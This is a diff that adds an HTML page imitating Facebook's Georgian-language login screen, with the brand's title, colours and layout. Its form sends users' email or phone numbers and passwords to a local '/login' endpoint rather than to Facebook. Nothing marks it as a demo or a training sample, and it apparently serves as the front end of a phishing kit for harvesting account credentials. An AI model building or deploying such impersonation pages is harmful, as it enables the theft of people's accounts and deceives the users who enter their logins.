@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="ka">
+<head>
+    <meta charset="UTF-8">
+    <title>Facebook – შესვლა ან რეგისტრაცია</title>
+    <style>
+        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-container { width: 400px; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); text-align: center; }
+        h1 { color: #1877f2; font-size: 40px; margin-bottom: 20px; }
+        input { width: 90%; padding: 14px; margin: 10px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; }
+        button { width: 97%; padding: 14px; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-size: 20px; font-weight: bold; cursor: pointer; }
+        button:hover { background-color: #166fe5; }
+        .footer-links { margin-top: 15px; color: #1877f2; font-size: 14px; text-decoration: none; display: block; }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h1>facebook</h1>
+        <form action="/login" method="POST">
+            <input type="text" name="email" placeholder="ელ-ფოსტა ან ტელეფონის ნომერი" required>
+            <input type="password" name="password" placeholder="პაროლი" required>
+            <button type="submit">შესვლა</button>
+        </form>
+        <a href="#" class="footer-links">დაგავიწყდათ პაროლი?</a>
+        <hr style="margin: 20px 0; border: 0.5px solid #dadde1;">
+        <button style="background-color: #42b72a; width: 70%; font-size: 17px;">ახალი ანგარიშის შექმნა</button>
+    </div>
+</body>
+</html>
